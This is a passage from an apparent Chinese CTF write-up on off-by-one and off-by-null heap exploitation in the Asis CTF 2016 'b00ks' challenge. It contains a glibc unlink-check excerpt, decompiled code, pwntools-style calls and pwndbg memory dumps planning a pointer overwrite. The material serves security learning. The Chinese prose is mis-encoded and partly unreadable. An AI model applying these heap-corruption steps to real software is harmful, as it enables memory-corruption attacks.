ï¼Œä»è€Œé€ æˆå—ä¹‹é—´å‘ç”Ÿé‡å ã€‚æ­¤æ–¹æ³•çš„å…³é”®åœ¨äº unlink çš„æ—¶å€™æ²¡æœ‰æ£€æŸ¥æŒ‰ç…§  <code>prev_size</code>  æ‰¾åˆ°çš„å—çš„å¤§å°ä¸ <code>prev_size</code>  æ˜¯å¦ä¸€è‡´ã€‚</li></ol></blockquote><p>â€‹æœ€æ–°ç‰ˆæœ¬ä»£ç ä¸­ï¼Œå·²åŠ å…¥é’ˆå¯¹ 2 ä¸­åä¸€ç§æ–¹æ³•çš„ check ï¼Œä½†æ˜¯åœ¨ 2.28 åŠä¹‹å‰ç‰ˆæœ¬å¹¶æ²¡æœ‰è¯¥ check ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="type">long</span>) prevsize));</span><br><span class="line">      <span class="comment">/* åä¸¤è¡Œä»£ç åœ¨æœ€æ–°ç‰ˆæœ¬ä¸­åŠ å…¥ï¼Œåˆ™ 2 çš„ç¬¬äºŒç§æ–¹æ³•æ— æ³•ä½¿ç”¨ï¼Œä½†æ˜¯ 2.28 åŠä¹‹å‰éƒ½æ²¡æœ‰é—®é¢˜ */</span></span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿˜æœ‰ç§æƒ…å†µï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> bss[<span class="number">0x20</span>] = <span class="string">&quot;aaaaaaaaaaaaaaaa&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">strlen</span>(bss) == <span class="number">0x10</span>)&#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(buf,bss);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹è¿™ç§æƒ…å†µï¼Œä¹çœ‹ä¸Šå»æ²¡å•¥é—®é¢˜ï¼Œä½†æ˜¯ï¼Œstrlen ä¸ä¼šè®¡ç®—ç»“å°¾çš„ \x00ï¼Œè€Œ strcpy åœ¨æ‹·è´çš„æ—¶å€™åˆä¼šå¤šæ‹·è´ä¸€ä¸ª \x00 è¿›å»ï¼Œé€ æˆå¤šå†™å…¥äº†ä¸€ä¸ªå­—èŠ‚ã€‚</p><p>â€‹ä¸Šä¸€ä¸ªé¢˜ï¼š</p><h2 id="asis-ctf-2016-b00ksåªçœ‹å‰é¢off-by-oneçš„éƒ¨åˆ†"><a class="markdownIt-Anchor" href="#asis-ctf-2016-b00ksåªçœ‹å‰é¢off-by-oneçš„éƒ¨åˆ†">#</a> Asis CTF 2016 <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N0Zi13aWtpL2N0Zi1jaGFsbGVuZ2VzL3RyZWUvbWFzdGVyL3B3bi9oZWFwL29mZl9ieV9vbmUvQXNpc18yMDE2X2IwMGtz">b00ks</span>ï¼ˆåªçœ‹å‰é¢ off by one çš„éƒ¨åˆ†ï¼‰</h2><p>â€‹checksec ä¸€ä¸‹çœ‹çœ‹ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">g01den@MSI:/mnt/c/Users/20820/Downloads$ checksec pwn</span><br><span class="line">[*] &#x27;/mnt/c/Users/20820/Downloads/pwn&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><p>â€‹æ¿€æ´»äº† PIEï¼Œä»¥åŠé¢˜ç›®é™„ä»¶è¢« strip è¿‡ï¼ŒæŠ±æ­‰ï¼Œæˆ‘ä¸€ä¸ªèœé¸¡è¯¯å…¥äº†å¤§ä½¬çš„ä¸–ç•Œï¼Œå•¥éƒ½çœ‹ä¸æ‡‚ï¼Œåç¼–è¯‘ä¹‹åçœ‹åˆ°é‚£ä¹ˆæŠ½è±¡çªç„¶æƒ³æ”¾å¼ƒäº†ï¼Œä¸è¿‡è¿˜æ˜¯å¾—åšã€‚</p><p>â€‹é¢˜ç›®æ˜¯ä¸€ä¸ªå¯»å¸¸çš„å›¾ä¹¦ç®¡ç†ï¼Œæœ‰åˆ›å»ºä¹¦ï¼Œåˆ é™¤ä¹¦ï¼Œç¼–è¾‘æè¿°å†…å®¹ï¼Œè¾“å‡ºä¹¦ç±ä¿¡æ¯ï¼Œä¿®æ”¹æœ€è¿‘è®¿é—®çš„ä½œè€…åï¼Œé€€å‡ºã€‚</p><p>â€‹å…ˆä¸çœ‹åˆ«çš„ï¼Œmain æ²¡å•¥ç”¨ï¼Œå…ˆçœ‹ addï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">sub_F55</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="type">void</span> *v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book name size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">goto</span> LABEL_2;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter book name (Max 32 chars): &quot;</span>);</span><br><span class="line">  ptr = <span class="built_in">malloc</span>(v1);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;unable to allocate enough space&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)readName(ptr, v1 - <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fail to read name&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> LABEL_17;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\nEnter book description size: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_2:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Malformed size&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="built_in">malloc</span>(v1);</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Enter book description: &quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)readName(v5, v1 - <span class="number">1</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Unable to read description&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v2 = sub_B24();</span><br><span class="line">        <span class="keyword">if</span> ( v2 == <span class="number">-1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Library is full&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v3 = <span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">          <span class="keyword">if</span> ( v3 )</span><br><span class="line">          &#123;</span><br><span class="line">            *((_DWORD *)v3 + <span class="number">6</span>) = v1;</span><br><span class="line">            *((_QWORD *)off_202010 + v2) = v3;</span><br><span class="line">            *((_QWORD *)v3 + <span class="number">2</span>) = v5;</span><br><span class="line">            *((_QWORD *)v3 + <span class="number">1</span>) = ptr;</span><br><span class="line">            *(_DWORD *)v3 = ++unk_202024;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Unable to allocate book struct&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Fail to allocate memory&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">LABEL_17:</span><br><span class="line">  <span class="keyword">if</span> ( ptr )</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="keyword">if</span> ( v5 )</span><br><span class="line">    <span class="built_in">free</span>(v5);</span><br><span class="line">  <span class="keyword">if</span> ( v3 )</span><br><span class="line">    <span class="built_in">free</span>(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹åˆ†æä¸€æ³¢ï¼Œæœ‰ä¸€äº›éœ€è¦è®°ä½ä½œç”¨çš„é˜¿å˜é‡åï¼Œæ¯”å¦‚ v1ï¼š</p><blockquote><ul><li><p>v1 å¯ä»¥å¾ˆæ˜æ˜¾çœ‹å‡ºæ¥ï¼Œv1 æ˜¯å­˜æ”¾çš„æ˜¯ book çš„ name çš„å¤§å°ï¼Œptr å°±æ˜¯ name å­˜æ”¾çš„åœ°å€ï¼š</p></li><li><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v1 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nEnter book name size: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v1 <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token keyword">goto</span> LABEL_2<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Enter book name (Max 32 chars): "</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>codeï¿¼<span class="token number">5</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li><li><p>ä¹‹åå¼€äº†ä¸ª v3ï¼Œå­˜æ”¾äº† book çš„æ‰€æœ‰ä¿¡æ¯ï¼š</p></li><li><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>v3 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x20uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>          <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">=</span> v1<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>off_202010 <span class="token operator">+</span> v2<span class="token punctuation">)</span> <span class="token operator">=</span> v3<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">=</span> v5<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> ptr<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>            <span class="token operator">*</span><span class="token punctuation">(</span>_DWORD <span class="token operator">*</span><span class="token punctuation">)</span>v3 <span class="token operator">=</span> <span class="token operator">++</span>unk_202024<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>            <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>          <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span>codeï¿¼<span class="token number">6</span><span class="token operator">--</span><span class="token operator">></span></pre></td></tr></table></figure></li></ul></blockquote><p>â€‹åˆ†é…ä¸¤æ¬¡ï¼Œä»£ç ç±»ä¼¼è¿™æ ·ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&quot;book1_name&quot;</span>,<span class="number">200</span>,<span class="string">&quot;book1_destruct&quot;</span>)</span><br><span class="line">add(<span class="number">0x21000</span>,<span class="string">&quot;book1_name&quot;</span>,<span class="number">0x21000</span>,<span class="string">&quot;book1_destruct&quot;</span>)</span><br></pre></td></tr></table></figure><p>â€‹è¿™ä¸ªå‡½æ•°å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œa1 æ˜¯æˆ‘ä»¬æƒ³è¦å†™å…¥çš„å­—ç¬¦ä¸²çš„èµ·å§‹åœ°å€ï¼Œa2 æ˜¯åˆ¤å®šè¾¹ç¼˜ï¼Œä½†æ˜¯ï¼Œä» 0 å¼€å§‹ï¼Œä¸€ç›´åˆ° a2 ä¸ºæ­¢ï¼Œå¾ˆæ˜¾ç„¶å¤šè¿›è¡Œäº†ä¸€æ¬¡è¯»å…¥ï¼Œå› ä¸ºè¿™é‡Œçš„é€»è¾‘æ˜¯å…ˆè¯»å…¥ï¼Œå†åˆ¤æ–­ i ä¸ a2 æ˜¯å¦ç›¸ç­‰ï¼Œæ‰€ä»¥è¿™é‡Œå°±å¤šå¾ªç¯äº†ä¸€æ¬¡ï¼Œé€ æˆäº† offbyoneï¼Œç»“æŸå¾ªç¯ä¹‹åï¼Œåˆå°†åä¸€ä½çš„å†…å­˜ä¿®æ”¹æˆäº† \x00ï¼Œå› æ­¤å‘ç”Ÿäº†æº¢å‡ºï¼Œä¾‹å¦‚ä¸€ä¸ªæ•°ç»„æ˜¯ 32 å­—èŠ‚ï¼Œè¿™ä¸ªç¨‹åºè°ƒç”¨è¿™ä¸ªå‡½æ•°çš„æ—¶å€™ï¼Œä¸€ç›´éƒ½æ˜¯ç”¨çš„ size-1ï¼Œæ‰€ä»¥ä¼ å…¥çš„æ˜¯ 31ï¼Œè¿™ä¸ªç¨‹åºå°±åˆšå¥½åšåˆ°äº†è®©æ•´ä¸ªæ•°ç»„åˆšå¥½å¯ä»¥å†™æ»¡ï¼Œä¹Ÿå°±æ˜¯å†™é“ buf [31]ï¼Œè¿™é‡Œåˆšå¥½å†™æ»¡ï¼Œä½†æ˜¯ï¼Œæœ‰ä¸ªå…³é”®çš„é—®é¢˜ï¼Œæœ€åä¸€ä¸ªè¿˜æ“ä½œäº†ä¸€ä¸‹ï¼Œè®© * a1=0ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº† buf [32]=0 çš„å‘ç”Ÿï¼Œæº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚ï¼Œä¹Ÿå°±é€ æˆäº† offbyoneï¼Œæˆ–è€…è¯´ off by nullã€‚</p><p>â€‹ä¸Š gdb çœ‹çœ‹ï¼Œå…ˆè¾“å…¥ 32 ä¸ª a ä½œä¸ºåå­—ä¹‹åï¼Œé‚£æ®µå†…å­˜å˜æˆäº†è¿™æ ·ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">search aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span></span><br><span class="line">Searching for value: &#x27;aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa&#x27;</span><br><span class="line">pwn             0x555555602040 0x6161616161616161 (&#x27;aaaaaaaa&#x27;)</span><br><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602060: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹è¿™é‡Œæˆ‘æƒ³ç€ç›´æ¥é€šè¿‡ IDA åç¼–è¯‘çš„æ¥ç¡®å®šè¿™ä¿© BSS æ®µæ•°æ®çš„åœ°å€çš„ï¼Œç»“æœ IDA é‡Œè«åå…¶å¦™çš„ï¼Œæœ‰ç‚¹æ€ªæ€ªçš„ï¼Œè¿™é‡Œå°±ç›´æ¥ GDB è°ƒç®—åç§»ç„¶åç®—çœŸå®åœ°å€ä¹‹ç±»çš„å§ã€‚é¦–å…ˆï¼Œåˆšåˆšé‚£é‡Œç¡®å®šäº†ä½œè€… name çš„é‚£ä¸ªåœ°å€ä¸ºï¼š0x555555602040ï¼Œgdb é‡Œè°ƒçš„æ—¶å€™æŸ¥åˆ° elf çš„åŸºåœ°å€ä¸ºï¼š0x555555400000ï¼ˆæ‰‹åŠ¨è®¡ç®—å‡ºæ¥çš„ï¼‰ï¼Œç„¶åç®—å‡º bss é‡Œä½œè€… name çš„åç§»ä¸ºï¼š0x202040ï¼ŒåŠ èµ·æ¥ä¹‹åå’Œ 0x555555602040 è¿™ä¸ªåœ°å€ä¸€æ ·ï¼Œæ‰€ä»¥ï¼Œå¯ä»¥æ–­å®šï¼Œè¿™ä¸ªåœ°å€å°±æ˜¯å­˜æ”¾ä½œè€…åå­—çš„åœ°æ–¹ï¼Œä¹‹åï¼Œç»è¿‡ä¸¤æ¬¡ç”³è¯·å†…å­˜ä¹‹åï¼Œå†çœ‹çœ‹ 0x555555602040 åœ°å€çš„å†…å­˜ï¼ˆæ ¹æ®ç»“æ„ä½“æŒ‡é’ˆæ•°ç»„åœ¨ bss æ®µä¸Šï¼Œç„¶åæš´åŠ›ç»è¿‡ä¸¤æ¬¡ malloc ä¹‹åæŸ¥è¯¢ bss æ®µå†…å®¹æœ‰æ— å˜åŒ–å‘ç°äº†ä¸€äº›å°‘é‡å˜åŒ–ï¼Œç”±æ­¤å®šä½ç»“æ„ä½“æŒ‡é’ˆæ•°ç»„çš„åœ°å€ï¼‰ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x555555602040</span></span><br><span class="line">0x555555602040: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602050: 0x6161616161616161      0x6161616161616161</span><br><span class="line">0x555555602060: 0x00005555556037a0      0x00005555556037d0</span><br><span class="line">0x555555602070: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602080: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602090: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555556020f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602100: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602110: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555602120: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å‘ç° 0x555555602060 è¿™ä¸ªåœ°å€çš„å†…å®¹å˜äº†ï¼Œå¹¶ä¸”ï¼Œè¿˜æ˜¯æŸä¸ªä¹¦çš„ç»“æ„ä½“çš„æ•°æ®åŸŸçš„åœ°å€ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x00005555556037a0</span></span><br><span class="line">0x5555556037a0: 0x0000000000000001      0x00005555556036b0</span><br><span class="line">0x5555556037b0: 0x00005555556036d0      0x00000000000000c8</span><br><span class="line">0x5555556037c0: 0x0000000000000000      0x0000000000000031</span><br><span class="line">0x5555556037d0: 0x0000000000000002      0x00007ffff7d66010</span><br><span class="line">0x5555556037e0: 0x00007ffff7d44010      0x0000000000021000</span><br><span class="line">0x5555556037f0: 0x0000000000000000      0x0000000000020811</span><br><span class="line">0x555555603800: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603810: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603820: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603830: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603840: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603850: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603860: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603870: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555603880: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹åˆšå¥½æ•´ä¸ªç¨‹åºå­˜åœ¨ä¸€ä¸ªä¿®æ”¹ä½œè€…åå­—çš„åŠŸèƒ½ï¼Œå¯ä»¥ä¿®æ”¹ä½œè€…åå­—ï¼Œè¿›è¡Œç¬¬äºŒæ¬¡ off by nullï¼Œä¿®æ”¹ 0x00005555556036f0 ä¸º 0x0000555555603600ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 